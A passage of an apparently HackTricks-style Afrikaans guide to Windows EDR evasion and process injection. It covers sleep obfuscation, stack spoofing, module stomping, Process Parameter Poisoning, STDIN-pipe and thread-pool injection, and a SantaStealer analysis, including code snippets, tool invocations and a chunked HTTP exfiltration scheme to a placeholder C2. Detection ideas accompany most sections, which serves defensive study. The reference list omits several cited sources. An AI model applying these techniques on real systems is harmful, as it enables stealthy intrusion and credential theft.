- IAT-integriteit: entries wat na nie-image- (heap/anon-) adresse resolve; periodieke verifikasie van import pointers.
- Stack-anomalieë: return addresses wat nie aan gelaaide images behoort nie; skielike oorgange na nie-image-PIC; inkonsekwente RtlUserThreadStart-afstamming.
- Loader-telemetrie: in-process-skrywes na die IAT, vroeë DllMain-aktiwiteit wat import thunks wysig, onverwagte RX-areas wat tydens laai geskep word.
- Image-load-evasion: as jy LoadLibrary* hook, monitor verdagte ladings van automation/clr-assemblies wat met geheuemaskeringsgebeurtenisse saamval.

Verwante boublokke en voorbeelde
- Reflective loaders wat IAT-patching tydens laai uitvoer (bv. TitanLdr, AceLdr)
- Memory-masking-hooks (bv. simplehook) en stack-cutting-PIC (stackcutting)
- PIC call-stack-spoofing-stubs (bv. Draugr)


## IAT-hooking tydens import + sleep-obfuscation (Crystal Palace/PICO)

### IAT-hooks tydens import via ’n inwonende PICO

As jy ’n reflective loader beheer, kan jy imports tydens `ProcessImports()` hook deur die loader se `GetProcAddress`-pointer met ’n pasgemaakte resolver te vervang wat hooks eerste nagaan:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Bou ’n **inwonende PICO** (aanhoudende PIC-object) wat voortbestaan nadat die tydelike loader-PIC homself bevry.
- Exporteer ’n `setup_hooks()`-funksie wat die loader se import resolver oorskryf (bv. `funcs.GetProcAddress = _GetProcAddress`).
- Slaan in `_GetProcAddress` ordinal imports oor en gebruik ’n hash-gebaseerde hook-opsoek soos `__resolve_hook(ror13hash(name))`. As ’n hook bestaan, gee dit terug; andersins delegeer na die regte `GetProcAddress`.
- Registreer hook-teikens tydens linking met Crystal Palace `addhook "MODULE$Func" "hook"`-inskrywings. Die hook bly geldig omdat dit binne die inwonende PICO woon.

Dit lewer **IAT-herleiding tydens import** sonder om die gelaaide DLL se kodeafdeling ná laai te patch.

### Dwing hookbare imports af wanneer die teiken PEB-walking gebruik

Hooks tydens import word net geaktiveer as die funksie werklik in die teiken se IAT voorkom. As ’n module APIs via ’n PEB-walk + hash resolveer (sonder ’n import-inskrywing), dwing ’n werklike import af sodat die loader se `ProcessImports()`-pad dit kan opspoor:

- Vervang hash-gebaseerde export-resolusie (bv. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) met ’n direkte verwysing soos `&WaitForSingleObject`.
- Die compiler genereer ’n IAT-inskrywing, wat onderskepping moontlik maak wanneer die reflective loader imports resolveer.

### Ekko-styl sleep/idle-obfuscation sonder om `Sleep()` te patch

In plaas daarvan om `Sleep` te patch, hook die **werklike wait/IPC-primitiewe** wat die implant gebruik (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Vir lang waits, omhul die oproep met ’n Ekko-styl obfuscation-ketting wat die in-memory image tydens idle enkripteer:<sup>[[31]](#references)[[27]](#references)</sup>

- Gebruik `CreateTimerQueueTimer` om ’n reeks callbacks te skeduleer wat `NtContinue` met vervaardigde `CONTEXT`-frames aanroep.
- Tipiese ketting (x64): stel image op `PAGE_READWRITE` → enkripteer met RC4 via `advapi32!SystemFunction032` oor die volledige gemapte image → voer die blokkerende wait uit → dekripteer met RC4 → **herstel toestemmings per afdeling** deur PE-afdelings deur te loop → sein voltooiing.
- `RtlCaptureContext` verskaf ’n `CONTEXT`-sjabloon; kloon dit in verskeie frames en stel registers (`Rip/Rcx/Rdx/R8/R9`) om elke stap aan te roep.

Operasionele besonderheid: gee “success” terug vir lang waits (bv. `WAIT_OBJECT_0`) sodat die caller voortgaan terwyl die image gemasker is. Hierdie patroon verberg die module vir scanners tydens idle-tydperke en vermy die klassieke “gepatchte `Sleep()`”-handtekening.

Detection-idees (gebaseer op telemetrie)
- Vlae van `CreateTimerQueueTimer`-callbacks wat na `NtContinue` wys.
- `advapi32!SystemFunction032` wat op groot, aaneenlopende buffers van image-grootte gebruik word.
- Groot `VirtualProtect`-reekse gevolg deur pasgemaakte herstel van toestemmings per afdeling.

### Runtime CFG-registrasie vir sleep-obfuscation-gadgets

Op CFG-geaktiveerde teikens sal die eerste indirekte sprong na ’n mid-function-gadget soos `jmp [rbx]` of `jmp rdi` gewoonlik die proses laat crash met `STATUS_STACK_BUFFER_OVERRUN`, omdat die gadget nie in die module se CFG-metadata voorkom nie. Om Ekko/Kraken-styl-kettings binne geharde prosesse aan die gang te hou:<sup>[[30]](#references)</sup>

- Registreer elke indirekte bestemming wat die ketting gebruik met `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` en `CFG_CALL_TARGET_VALID`-inskrywings.
- Vir adresse binne gelaaide images (`ntdll`, `kernel32`, `advapi32`), moet die `MEMORY_RANGE_ENTRY` by die **image base** begin en die **volle image-grootte** dek.
- Gebruik eerder die **allocation base** en allocation-grootte vir handmatig gemapte/PIC/stomped-areas.
- Merk nie net die dispatch-gadget nie, maar ook exports wat indirek bereik word (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event-syscalls) en enige uitvoerbare afdelings wat deur die aanvaller beheer word en indirekte teikens sal word.

Dit verander ROP/JOP-styl-sleep-kettings van “werk net in nie-CFG-prosesse” na ’n herbruikbare primitief vir `explorer.exe`, browsers, `svchost.exe` en ander endpoints wat met `/guard:cf` gecompileer is.

### CET-veilige stack-spoofing vir slapende threads

Volledige `CONTEXT`-vervanging is opvallend en kan op CET Shadow Stack-stelsels breek, omdat ’n vervalste `Rip` steeds met die hardeware-shadow stack moet ooreenstem. ’n Veiliger sleep-masking-patroon is:<sup>[[30]](#references)</sup>

- Kies ’n ander thread in dieselfde proses en lees sy `NT_TIB` / TEB-stackgrense (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Rugsteun die huidige thread se werklike TEB/TIB.
- Vang die werklike slapende context vas met `GetThreadContext`.
- Kopieer **slegs** die werklike `Rip` na die spoof-context en laat die vervalste `Rsp`/stack-toestand onveranderd.
- Kopieer tydens die slaapvenster die spoof-thread se `NT_TIB` na die huidige TEB sodat stack walkers binne ’n geldige stack-reeks unwind.
- Herstel ná die wait die oorspronklike TIB en thread-context.

Dit behou ’n CET-konsekwente instruction pointer terwyl dit EDR-stack walkers mislei wat TEB-stack-metadata vertrou om unwinds te valideer.

### APC-gebaseerde alternatief: Kraken Mask

As timer-queue-dispatch te kenmerkend is, kan dieselfde sleep-encrypt-spoof-restore-volgorde vanaf ’n opgeskorte helper-thread met queued APCs uitgevoer word:<sup>[[27]](#references)</sup>

- Skep ’n helper-thread met `NtTestAlert` as entrypoint.
- Queue voorbereide `CONTEXT`-frames/APCs met `NtQueueApcThread` en dreineer dit met `NtAlertResumeThread`.
- Stoor die kettingtoestand op die heap in plaas van die helper-stack om te voorkom dat die verstek 64 KB-thread-stack opgebruik word.
- Gebruik `NtSignalAndWaitForSingleObject` om die start event atomies te sein en te blokkeer.
- Skort die main thread op voordat die TIB/context herstel word (`NtSuspendThread` → herstel → `NtResumeThread`) om die race window te verklein waarin ’n scanner ’n gedeeltelik herstelde stack kan opspoor.

Dit vervang die `CreateTimerQueueTimer` + `NtContinue`-handtekening met ’n helper-thread/APC-handtekening, terwyl dieselfde RC4-masking- en stack-spoofing-doelwitte behoue bly.

Bykomende detection-idees
- `NtSetInformationVirtualMemory` met `VmCfgCallTargetInformation` kort voor sleeps, waits of APC-dispatch.
- `GetThreadContext`/`SetThreadContext` wat om `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` of `ConnectNamedPipe` gewikkel is.
- `NtQueryInformationThread` gevolg deur direkte skrywes na die huidige thread se TEB/TIB-stackgrense.
- `NtQueueApcThread`/`NtAlertResumeThread`-kettings wat indirek `SystemFunction032`, `VirtualProtect` of helpers vir die herstel van afdelingstoestemmings bereik.
- Herhaalde gebruik van kort gadget-handtekeninge soos `FF 23` (`jmp [rbx]`) of `FF E7` (`jmp rdi`) as dispatch-pivots binne signed modules.


## Presisie-module-stomping

Module stomping voer payloads uit die **`.text`-afdeling van ’n DLL wat reeds in die teikenproses gemap is** uit, in plaas daarvan om duidelike private uitvoerbare geheue toe te ken of ’n nuwe weggooibare DLL te laai. Die oorskryf-teiken behoort ’n **gelaaide, skyf-ondersteunde image** te wees waarvan die kode-area die payload kan akkommodeer sonder om kodepaaie te beskadig wat die proses steeds nodig het.<sup>[[1]](#references)[[2]](#references)</sup>

### Betroubare teikenkeuse

Naïewe stomping teen algemene modules soos `uxtheme.dll` of `comctl32.dll` is onbetroubaar: die DLL is dalk nie in die afgeleë proses gelaai nie, en ’n te klein kode-area sal die proses laat crash. ’n Betroubaarder werkvloei is:

1. Enumereer die teikenproses se modules en hou ’n **name-only-include-lys** van DLLs wat reeds gelaai is.
2. Bou eers die payload en teken die **presiese aantal grepe** aan.
3. Skandeer kandidaat-DLLs op skyf en vergelyk die PE-afdeling se **`.text` `Misc_VirtualSize`** met die payload-grootte. Dit is belangriker as die lêergrootte, omdat dit die grootte van die uitvoerbare afdeling **wanneer dit in geheue gemap is** weerspieël.
4. Ontleed die **Export Address Table (EAT)** en kies ’n geëksporteerde funksie-RVA as die beginoffset vir stomping.
5. Bereken die **ontploffingsradius**: as die payload die geselekteerde funksiegrens oorskry, sal dit aangrensende exports oorskryf wat daarna in geheue gelê is.

Tipiese recon-/keusehelpers wat in die praktyk voorkom:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operasionele notas
- Verkies DLL's wat **reeds gelaai** is in die afgeleë proses om die telemetrie van `LoadLibrary`/onverwagte image loads te vermy.
- Verkies exports wat selde deur die teikentoepassing uitgevoer word; anders kan normale kodepaaie die gewysigde grepe tref voor of ná thread creation.
- Groot implants vereis dikwels dat shellcode-inbedding van 'n string literal na 'n **byte-array/braced initializer** verander word sodat die volledige buffer korrek in die injector source verteenwoordig word.

Opsporingsidees
- Afgeleë skryfbewerkings na image-backed executable pages (`MEM_IMAGE`, `PAGE_EXECUTE*`) in plaas van die meer algemene private RWX/RX allocations.
- Export entry points waarvan die in-geheue-grepe nie meer met die backing file op skyf ooreenstem nie.
- Remote threads of context pivots wat uitvoering begin binne 'n legitieme DLL export waarvan die eerste grepe onlangs gewysig is.
- Verdagte `VirtualProtect(Ex)` / `WriteProcessMemory`-reekse teen DLL `.text`-bladsye, gevolg deur thread creation.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) is 'n **process-injection / EDR-evasion**-tegniek wat die klassieke remote write path (`VirtualAllocEx` + `WriteProcessMemory`) vermy. In plaas daarvan om grepe na 'n reeds lopende teiken te kopieer, misbruik dit die feit dat Windows **geselekteerde `CreateProcessW`-opstartparameters na die child process kopieer** en dit binne `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) stoor.<sup>[[28]](#references)[[29]](#references)</sup>

### Vergiftigbare draers wat deur `CreateProcessW` gekopieer word

Nuttige draers is:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (met `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktiese beperkings vir draers:

- `lpCommandLine` moet na **skryfbare geheue** wys vir `CreateProcessW`, en is beperk tot **32,767 Unicode-karakters**, insluitend die null-terminator.
- `lpEnvironment` moet 'n Unicode-omgewingsblok wees met opeenvolgende `NAME=VALUE\0`-stringe wat deur 'n ekstra `\0` beëindig word.
- `lpReserved` is amptelik gereserveer, dus moet die `ShellInfo`-kartering as 'n implementeringsdetail beskou word eerder as 'n stabiele, gedokumenteerde kontrak.

Dit maak normale process creation die **payload-transfer primitive**. Die operateur skep die child process met aanvallerbeheerde opstartdata en laat Windows die kopie tussen prosesse uitvoer.

### Afgeleë opsoekvloei sonder remote write API's

Nadat die child geskep is, los die gekopieerde buffer met **leesalleen**-primitives op:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → kry `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Lees die afgeleë `PEB`
3. Volg `PEB.ProcessParameters`
4. Lees `RTL_USER_PROCESS_PARAMETERS`
5. Gebruik die geselekteerde pointer:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimale vloei:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Uitvoering van die gekopieerde parameterbuffer

Die gekopieerde parameterstreek is gewoonlik `RW`, nie uitvoerbaar nie. ’n Algemene P3-ketting is:

1. Skep die proses normaalweg (nie opgeskort nie)
2. Maak die gekose parameterbladsy uitvoerbaar met `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Hergebruik die hoofthread-hanteerder wat reeds in `PROCESS_INFORMATION` teruggegee is
4. Herlei uitvoering met `NtSetContextThread` (`CONTEXT_CONTROL`, oorskryf `RIP`)

Anders as klassieke thread-hijacking-werkvloeie, **vereis** dit nie `SuspendThread` / `ResumeThread` nie; die konteks kan direk op die teruggekeerde hoofthread-hanteerder verander word.

Dit vermy verskeie API’s wat algemeen vir injection gemonitor word:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- dikwels ook `SuspendThread` / `ResumeThread`

### Nulgreepbeperking en gefaseerde shellcode

Al drie draers is **string- of stringagtige data**, dus word ’n rou payload wat `0x00` bevat tydens oordrag afgekap. ’n Praktiese oplossing is ’n **nulgreepvrye eerste stadium** wat konstantes tydens looptyd herbou en dan ’n willekeurige tweede stadium laai.

’n Eenvoudige patroon is XOR-gebaseerde konstantesintese:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Dit laat die eerste stadium toe om stack-strings, API-argumente, DLL-paaie of ’n tweede-stadium-shellcode-loader te bou sonder om nulgrepe in die oorgedraagde parameter in te sluit.

### Stack-gebaseerde API-oproepe vanaf die eerste stadium

Wanneer die eerste stadium API’s soos `LoadLibraryA` moet aanroep, kan dit:

- die string/buffer op die teiken se stack plaas
- die **32-byte x64-shadow space** reserveer
- `RCX`, `RDX`, `R8`, `R9` op konstantes of `RSP`-relatiewe wysers stel
- `RSP` **16-byte-belyn** hou voor die oproep

’n Tweede stadium kan dan vanaf die stack na ’n `PAGE_READWRITE`-toekenning gekopieer word, met `VirtualProtect` na `PAGE_EXECUTE_READ` verander word en daarheen gespring word, wat ’n direkte RWX-toekenning vermy.

### Opsporingsidees

Goeie opsporingsgeleenthede wat die outeurs noem:

- `VirtualProtectEx` / `NtProtectVirtualMemory` wat **prosesparameterbladsye uitvoerbaar maak**
- daardie beskermingsverandering gevolg deur `SetThreadContext` / `NtSetContextThread`
- afgeleë lesings van `PEB` en daarna `RTL_USER_PROCESS_PARAMETERS`
- buitengewoon lang / hoë-entropie `lpCommandLine`-, `lpEnvironment`- of `STARTUPINFO.lpReserved`-waardes tydens proseskepping

### Notas

- P3 is ’n **oordragtruuk tussen prosesse**, nie op sigself ’n volledige uitvoeringsprimitief nie: die gekopieerde parameter benodig steeds ’n verandering na uitvoertoestemmings en ’n metode om uitvoering daarheen te herlei.
- `RtlCreateProcessReflection` / Dirty Vanity is deur die outeurs oorweeg, maar verwerp omdat dit intern verdagte primitiewe soos `NtWriteVirtualMemory` en `NtCreateThreadEx` gebruik.

## STDIN-pypinspuiting in ’n konsole

’n Interaktiewe konsolekind kan ook as die **payload-oordragprimitief** gebruik word. Die inspuiter herlei die kind se standaardinvoer na ’n pyp en stuur ’n merker gevolg deur shellcode. Nadat die konsoleprogram die data in sy eie private geheue gelees het, vind die inspuiter daardie buffer, maak dit uitvoerbaar en herlei ’n kinddraad daarheen. Dit vermy `VirtualAllocEx` en `WriteProcessMemory`, maar is steeds process injection eerder as ’n algemene EDR-omseiling.<sup>[[41]](#references)</sup>

Ondanks die beskrywing “named-pipe” roep die verwysingsimplementering `CreatePipe` aan, wat ’n **anonieme pyp** skep. Windows implementeer anonieme pype intern met uniek benoemde pypobjekte, maar die PoC kies nie ’n `\\.\pipe\<name>`-pad nie en roep ook nie `CreateNamedPipe` aan nie. Dit skep oorerfbare handvatsels met ’n versteksekuriteitsbeskrywer, plaas die leeshandvatsel in `STARTUPINFO.hStdInput`, stel `STARTF_USESTDHANDLES` en begin ’n nuwe kind met oorerwing van handvatsels geaktiveer. Daarom begin hierdie PoC die verskafde konsole-uitvoerbare program; dit koppel nie sy pyp aan ’n bestaande proses nie.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Verwysingswerkvloei

Die implementering gebruik die volgende ketting:<sup>[[41]](#references)</sup>

1. Skep anonieme pyp-pare vir die kind se `STDIN` en `STDOUT`. Skakel oorerwing vir die twee handvatsels aan die ouerkant af en maak die duplikate aan die kindkant in die ouer toe nadat die proses geskep is.
2. Begin ’n interaktiewe uitvoerbare program soos `netsh.exe` of `nslookup.exe` met `CREATE_NEW_CONSOLE`. Die kind erf die herleide standaardhandvatsels.
3. Stuur die volledige binêre `rawData`-skikking deur die handvatsel aan die ouerkant van `STDIN` met `WriteFile`. Die konsoleprogram verbruik die grepe en laat ’n kopie in een van sy private, toegewyde geheuegebiede.
4. Loop deur die kind se adresruimte met `VirtualQueryEx`, lees kandidaat-`MEM_PRIVATE`-gebiede met `ReadProcessMemory` en soek die merker aan die begin van `rawData`.
5. Verander die ontdekte buffer na `PAGE_EXECUTE_READWRITE` met `VirtualProtectEx`.
6. Identifiseer die hoofdraad, skort dit op, stel `RIP` met `NtSetContextThread` op `found_address + 0x19` en hervat dit.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Die verskafde implementering is spesifiek vir x64: dit wysig `CONTEXT.Rip`, en die ingebedde payload is x64-shellcode. `rawData` begin met ’n merker van 25 grepe, dus begin uitvoerbare grepe by heksadesimale offset `0x19`. Wanneer jy die payload vervang, behou daardie uitleg of werk die merker, soekvektor, skikkinggrootte en uitvoeringsoffset saam by. Die bronkode se opmerkings lys ook `0x0A`, `0x0D` en `0x1A` as bad characters. Hierdie werkvloei verander nie die kindproses se token of voorregte nie.<sup>[[41]](#references)</sup>

Sien [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md) vir patrone vir klein native helpers en die samestelling van payloads.

## Thread-pool callback DLL-inspuiting sonder shellcode (DLLParty)

DLLParty pas PoolParty-styl thread-pool-inspuiting aan sodat ’n bestaande teikenwerker `LoadLibraryA` oproep, eerder as om ’n ingespuite callback-stub uit te voer. Die dispatch-primitief daarvan is ’n `TP_DIRECT`-voltooiing wat by die teikenpoel se I/O completion-poort in die tou geplaas word. Dit omseil nie prosestoestemmings nie: die PoC roep `OpenProcess(PROCESS_ALL_ACCESS)` aan en benodig leesbare/skryfbare teikengeheue plus dupliseerbare worker-factory- en completion-port-handvatsels.<sup>[[46]](#references)[[47]](#references)</sup>

Op Windows x64 gee die worker ’n wyser na sy stapelgebaseerde `TP_CALLBACK_INSTANCE` in `RCX`, die eerste callback-argument. `LoadLibraryA` interpreteer dieselfde wyser as ’n `LPCSTR`. Op die getoetste pad bou `TppWorkerThread` die wyser by `RSP+0x178`, terwyl sy eerste gewone skryfbewerking in daardie objek by `RSP+0x1d0` plaasvind. ’n Nulbeëindigde DLL-pad wat binne hierdie voorvoegsel van 0x58 grepe pas, kan dus aan die begin van die instansie geplaas word sonder dat dit voor dispatch oorskryf word. Dit is ’n waarneming wat spesifiek vir hierdie bou is, nie ’n gedokumenteerde Windows ABI-waarborg nie.<sup>[[46]](#references)[[47]](#references)</sup>

Die verwysingswerkvloei is:<sup>[[46]](#references)[[47]](#references)</sup>

1. Lys die teiken se handvatsels met `NtQuerySystemInformation(SystemHandleInformation)` en identifiseer `TpWorkerFactory` deur objeksoorte te navraag. Dupliseer ’n worker-factory-handvatsel en vra `WorkerFactoryBasicInformation` aan; `StartParameter` gee die afgeleë `TP_POOL`. Slaan factories oor waarvan `TotalWorkerCount == 0`.
2. Lees `TP_POOL.CompletionPort` en deurloop die poel se private worker-lys. Op die getoetste Windows 10 19045 x64-bou (`ntdll.dll 10.0.19041.4842`) is die kop by `pool+0x60`; elke skakel is by `worker+0x10`, dus is die callback-instance-gleuf by `worker+0x38` gelyk aan `link+0x28`. Die PoC kontroleer wyserbelyning, skakel-wederkerigheid, poeleienaarskap, nie-nul draad-ID’s, herhaalde nodusse en ’n stabiele lystoek.
3. Skryf die DLL-pad na **elke** herwonne worker-gleuf, want enige worker kan die tou geplaasde completion verbruik. Plaas ’n `TP_DIRECT` met `Callback = LoadLibraryA` in skryfbare teikengeheue. Die PoC gebruik `last_slot-0x500` op ’n worker-stapel in plaas van `VirtualAllocEx`; daardie offset is eksperimenteel en mag nie met aktiewe stapeldata bots nie.
4. Dupliseer die teiken se completion-port-handvatsel en roep `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)` aan. Die afgeleë `TP_DIRECT`-adres is die completion-sleutel. ’n Bestaande worker roep dan `LoadLibraryA` aan met sy oorskryfde callback-instance-wyser, en laai ’n DLL waartoe die teiken reeds toegang het.

Die PoC neem ’n teiken-PID (`DLLParty.exe <target_pid>`) en gebruik ’n hardgekodeerde DLL-pad in `DLLParty.cpp`; stel ’n pad in wat vir die teiken toeganklik is voordat jy ’n x64-uitvoerbare lêer bou. Dit gebruik ook sy eie proses se `LoadLibraryA`-adres as die afgeleë callback, en aanvaar dus dat daardie adres geldig is in die teiken. Die kode kontroleer nie die padlengte teen die voorvoegsel van 0x58 grepe nie, en ook nie of die worker-deurloop ’n gleuf gevind het voordat die laaste element geïndekseer word nie. Verifieer die private offsets, stapeluitleg en skryfbare ruimte vir die teikenbou weer. Die weglating van `CreateRemoteThreadEx`, shellcode en `VirtualAllocEx` skakel nie skryfwerk tussen prosesse of telemetrie oor DLL-laai uit nie.<sup>[[46]](#references)[[47]](#references)</sup>

## SantaStealer se handelstaktieke vir lêerlose ontduiking en diefstal van aanmeldbewyse

SantaStealer (ook bekend as BluelineStealer) wys hoe moderne inligtingstelders AV-omseiling, anti-analise en toegang tot aanmeldbewyse in een werkvloei kombineer.<sup>[[24]](#references)</sup>

### Sleutelborduitleg-beperking en sandbox-vertraging

- ’n Konfigurasievlag (`anti_cis`) lys geïnstalleerde sleutelborduitlegte met `GetKeyboardLayoutList`. As ’n Cyrilliese uitleg gevind word, laat die sample ’n leë `CIS`-merker agter en eindig dit voordat die stealders loop. Só word verseker dat dit nooit in uitgeslote lokale afgaan nie, terwyl dit ’n artefak vir opsporing agterlaat.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Gelaagde `check_antivm`-logika

- Variant A loop deur die process list, bereken ’n hash van elke naam met ’n pasgemaakte rollende kontrolesom en vergelyk dit met ingebedde bloklyste vir debuggers/sandboxes; dit herhaal die kontrolesom vir die rekenaarnaam en kontroleer werkgidse soos `C:\analysis`.
- Variant B ondersoek stelseleienskappe (minimum aantal prosesse, onlangse uptime), roep `OpenServiceA("VBoxGuest")` aan om VirtualBox-additions op te spoor en voer tydkontroles rondom slaaptye uit om single-stepping raak te sien. Enige treffer laat die proses staak voordat modules begin.

### Lêerlose helper + dubbele ChaCha20-reflective loading

- Die primêre DLL/EXE bevat ’n Chromium-credential helper wat óf na skyf geskryf óf handmatig in geheue gekarteer word; in fileless mode los dit self imports/relocations op, sodat geen helper artifacts geskryf word nie.
- Dié helper stoor ’n tweede-fase-DLL wat twee keer met ChaCha20 geënkripteer is (twee 32-greep-sleutels + 12-greep-nonces). Ná albei dekripsiestappe laai dit die blob reflectively (geen `LoadLibrary` nie) en roep die exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` aan, afgelei van [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Die ChromElevator-roetines gebruik direct-syscall reflective process hollowing om in ’n aktiewe Chromium-blaaier te inject, AppBound Encryption-sleutels te erf en wagwoorde/cookies/kredietkaartinligting direk uit SQLite-databasisse te dekripteer, ondanks ABE-hardening.

### Modulêre in-geheue-insameling en HTTP-exfil in stukke

- `create_memory_based_log` loop deur ’n globale `memory_generators`-funksiewysertabel en begin een thread per geaktiveerde module (Telegram, Discord, Steam, skermskote, dokumente, blaaieruitbreidings, ens.). Elke thread skryf resultate na gedeelde buffers en rapporteer sy lêertelling ná ’n join-venster van ongeveer 45 sekondes.
- Wanneer dit klaar is, word alles met die staties gekoppelde `miniz`-biblioteek as `%TEMP%\\Log.zip` gezip. `ThreadPayload1` wag dan 15 sekondes en stuur die argief in stukke van 10 MB via HTTP POST na `http://<C2>:6767/upload`, met ’n blaaier se `multipart/form-data`-grens nageboots (`----WebKitFormBoundary***`). Elke stuk voeg `User-Agent: upload`, `auth: <build_id>` en, opsioneel, `w: <campaign_tag>` by. Die laaste stuk voeg `complete: true` by sodat die C2 weet dat die herbouing klaar is.

## References

- [1] [Gevorderde ontduikingstegnieke: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks: geen gratis passe meer vir malware nie](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentasie](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – voorbeeld](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – voorbeeld](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC vir call-stack-spoofing](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nuwe infection chain en ConfuserEx-gebaseerde obfuscation vir DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Moet jy jou zero trust vertrou? Omseiling van Zscaler se posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Voor ToolShell: Ondersoek na Storm-2603 se vorige ransomware-bedrywighede](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Misbruik van forwarded exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11-inventaris van forwarded exports (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – DLL-soekvolgorde](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process-sekuriteit en toegangsregte](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU-verwysing (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL-launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Teenwerking teen EDR’s met die ondersteuning van Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Breek Windows Defender se beskermende dop met die Folder Redirect-tegniek](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Verwysing vir die mklink-opdrag](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Onder die Pure Curtain: Van RAT tot builder tot coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer kom dorp toe: ’n Nuwe, ambisieuse infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – De-enkripsie van Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Om Node.js-malware met API-tracing te verslaan](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Om Adaptix met Crystal Palace aan die slaap te maak](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET en Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
